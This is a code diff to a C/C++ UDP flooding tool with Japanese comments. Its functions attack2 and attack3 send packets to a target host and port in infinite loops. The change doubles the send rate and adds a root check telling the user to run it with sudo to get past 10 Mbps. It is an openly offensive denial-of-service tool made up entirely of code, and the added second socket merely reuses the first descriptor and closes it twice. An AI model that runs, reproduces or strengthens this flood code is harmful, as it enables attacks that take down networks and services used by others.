@@ -51,7 +51,7 @@ void attack(char* str, int port)
 
 void attack2(char* str, int port)
 {
-    int sock;
+    int sock, sock2;
     struct sockaddr_in addr;
 
     addr.sin_family = AF_INET;
@@ -64,13 +64,15 @@ void attack2(char* str, int port)
     while (true) {
         try {
             //ソケット生成
-            sock = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
+            sock = sock2 = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
 
             //データ送信
             sendto(sock, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
+            sendto(sock2, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
 
             //ソケットを閉じる
             (*F_close)(sock);
+            (*F_close)(sock2);
         }
         catch (...) {
             perror("Error ");
@@ -81,7 +83,7 @@ void attack2(char* str, int port)
 
 void attack3(char* str, int port)
 {
-    int socks;
+    int socks, socks2;
     struct sockaddr_in addr;
 
     addr.sin_family = AF_INET;
@@ -94,13 +96,15 @@ void attack3(char* str, int port)
     while (true) {
         try {
             //ソケット生成
-            socks = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
+            socks = socks2 = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
 
             //データ送信
             sendto(socks, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
+            sendto(socks2, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
 
             //ソケットを閉じる
             (*F_close)(socks);
+            (*F_close)(socks2);
         }
         catch (...) {
             perror("Error ");
@@ -111,7 +115,12 @@ void attack3(char* str, int port)
 
 int main(int argc, char* argv[])
 {
-    struct hostent* he;
+    if (getuid() != 0) {
+        printf("\n管理者権限じゃないと10Mbps超えなかったから\nsudo付けてね。\n\n");
+        return -1;
+    }
+
+  　struct hostent* he;
     char* str = nullptr;
     int port;
 
